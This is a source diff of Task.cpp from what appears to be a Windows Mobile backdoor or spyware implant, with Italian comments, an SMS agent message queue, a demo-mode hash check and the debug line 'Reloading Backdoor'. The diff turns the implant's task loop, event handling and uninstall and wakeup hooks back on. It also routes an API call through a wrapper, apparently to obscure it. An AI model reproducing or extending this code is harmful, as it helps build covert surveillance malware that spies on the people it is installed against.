@@ -14,6 +14,8 @@
 #include "Date.h"
 #include "Common.h"
 
+#include "FunctionFunc.h"
+
 using namespace std;
 
 Task* Task::Instance = NULL;
@@ -36,7 +38,7 @@ Task* Task::self() {
 Task::Task() : statusObj(NULL), confObj(NULL), 
 deviceObj(NULL), uberlogObj(NULL), observerObj(NULL),
 modulesManager(NULL), wakeupEvent(NULL), uninstallRequested(FALSE) {
-	/***
+
 	Hash sha1;
 
 	BYTE sha[20];
@@ -44,7 +46,7 @@ modulesManager(NULL), wakeupEvent(NULL), uninstallRequested(FALSE) {
 		0x4e, 0xb8, 0x75, 0x0e, 0xa8, 0x10, 0xd1, 0x94, 
 		0xb4, 0x69, 0xf0, 0xaf, 0xa8, 0xf4, 0x77, 0x51, 
 		0x49, 0x69, 0xba, 0x72 };
-
+/***
 	MSGQUEUEOPTIONS_OS queue;
 
 	ZeroMemory(&queue, sizeof(queue));
@@ -60,14 +62,14 @@ modulesManager(NULL), wakeupEvent(NULL), uninstallRequested(FALSE) {
 
 	queue.bReadAccess = FALSE;
 	g_hSmsQueueWrite = CreateMsgQueue(L"IpcQueueLocalSAW", &queue); // Sms Agent Queue
-
-	wakeupEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+***/
+	wakeupEvent = _CreateEventW(NULL, FALSE, FALSE, NULL);
 
 	// Istanziamo qui tutti gli oggetti singleton dopo aver inizializzato le code
 	statusObj = Status::self();
-	deviceObj = Device::self();
+	///deviceObj = Device::self();
 	uberlogObj = UberLog::self();
-	observerObj = Observer::self();
+	///observerObj = Observer::self();
 	modulesManager = ModulesManager::self();
 	eventsManager = EventsManager::self();
 	actionsManager = ActionsManager::self();
@@ -76,7 +78,7 @@ modulesManager(NULL), wakeupEvent(NULL), uninstallRequested(FALSE) {
 
 	if (memcmp(sha, demoMode, 20) == 0)
 		demo = TRUE;
-		***/
+		
 }
 
 Task::~Task(){
@@ -86,10 +88,10 @@ Task::~Task(){
 ***/
 	if (statusObj)
 		delete statusObj;
-/***
+
 	if (confObj)
 		delete confObj;
-***/
+
 /***
 	// XXX Zozzerigi, rimuovere quando verra' implementata la classe IPC
 	if (g_hSmsQueueRead != NULL)
@@ -98,15 +100,15 @@ Task::~Task(){
 	if (g_hSmsQueueWrite != NULL)
 		CloseMsgQueue(g_hSmsQueueWrite);
 ***/
-/***
+
 	if (wakeupEvent)
 		CloseHandle(wakeupEvent);
-***/
+
 }
 
 void Task::StartNotification() {
 	
-	//Log logInfo;
+	///Log logInfo;
 
 	///logInfo.WriteLogInfo(L"Started");
 	
@@ -116,7 +118,7 @@ BOOL Task::TaskInit() {
 	/***
 	if (deviceObj)
 		deviceObj->RefreshData(); // Inizializza varie cose tra cui g_InstanceId
-
+***/
 	if (confObj) {
 		delete confObj;
 		confObj = NULL;
@@ -174,13 +176,13 @@ BOOL Task::TaskInit() {
 		BlinkLeds();
 	}
 #endif
-	***/
+	
 	return TRUE;
 }
 
 
 BOOL Task::CheckActions() {
-	/***
+	
 	_Sleep(1000);
 
 	_WaitForSingleObject(wakeupEvent, INFINITE);
@@ -210,23 +212,22 @@ BOOL Task::CheckActions() {
 	}
 
 	DBG_TRACE(L"Debug - Task.cpp - Reloading Backdoor\n", 1, FALSE);
-	***/
+
 	return TRUE;
 }
 
 void Task::uninstall() {
-	///uninstallRequested = TRUE;
+	uninstallRequested = TRUE;
 }
 
 void Task::wakeup() {
-	///SetEvent(wakeupEvent);
+	SetEvent(wakeupEvent);
 }
 
 BOOL Task::getDemo() {
-	/***
+
 #ifdef DEMO_MODE
 	return TRUE;
 #endif
-	***/
 	return demo;
 }
